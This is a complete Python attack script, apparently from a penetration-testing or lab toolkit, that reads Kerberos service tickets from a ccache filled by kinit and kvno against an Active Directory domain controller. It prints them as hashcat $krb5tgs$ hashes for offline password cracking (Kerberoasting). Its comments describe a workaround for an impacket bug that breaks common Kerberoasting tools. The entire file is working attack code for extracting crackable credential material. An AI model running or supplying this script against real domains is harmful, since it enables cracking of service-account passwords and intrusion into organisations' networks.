#!/usr/bin/env python3
# Parse a Kerberos ccache (populated by native `kinit` + `kvno <SPN>` against a Samba AD DC)
# into hashcat $krb5tgs$ format. This SIDESTEPS the impacket/Samba KRB_AP_ERR_INAPP_CKSUM bug
# that breaks GetUserSPNs.py -request AND `nxc ldap --kerberoasting` (both build the TGS-REQ
# with impacket's getKerberosTGS). Native MIT kinit/kvno mint the tickets correctly; impacket
# here only PARSES the resulting ccache, which never triggers the bug.
#
# Usage:
#   export KRB5CCNAME=FILE:/tmp/krb5cc_tars   # or pass the path as argv[1]
#   /opt/ad-tools-venv/bin/python extract-tgs-from-ccache.py > kerberoast.hashes
import os, sys
from impacket.krb5.ccache import CCache
from impacket.krb5.asn1 import Ticket as TicketAsn1
from pyasn1.codec.der import decoder

ccpath = (sys.argv[1] if len(sys.argv) > 1
          else os.environ.get("KRB5CCNAME", "").replace("FILE:", "") or "/tmp/krb5cc_tars")
cc = CCache.loadFile(ccpath)
n = 0
for cred in cc.credentials:
    server = cred["server"].prettyPrint().decode()
    if server.startswith("krbtgt/"):
        continue  # skip the TGT
    spn, realm = server.split("@", 1)
    tkt = decoder.decode(cred.ticket["data"], asn1Spec=TicketAsn1())[0]
    etype = int(tkt["enc-part"]["etype"])
    cipher = bytes(tkt["enc-part"]["cipher"].asOctets())
    label = spn.split("/")[0]  # service class as label; hashcat ignores this field
    if etype == 23:  # RC4-HMAC -> hashcat 13100
        print("$krb5tgs$23$*%s$%s$%s*$%s$%s" % (label, realm, spn, cipher[:16].hex(), cipher[16:].hex()))
        n += 1
    elif etype in (17, 18):  # AES128/256 -> hashcat 19600/19700
        print("$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (etype, label, realm, spn, cipher[-12:].hex(), cipher[:-12].hex()))
        n += 1
    else:
        sys.stderr.write("# unsupported etype %d for %s\n" % (etype, spn))
sys.stderr.write("[*] wrote %d hash(es) from %s\n" % (n, ccpath))
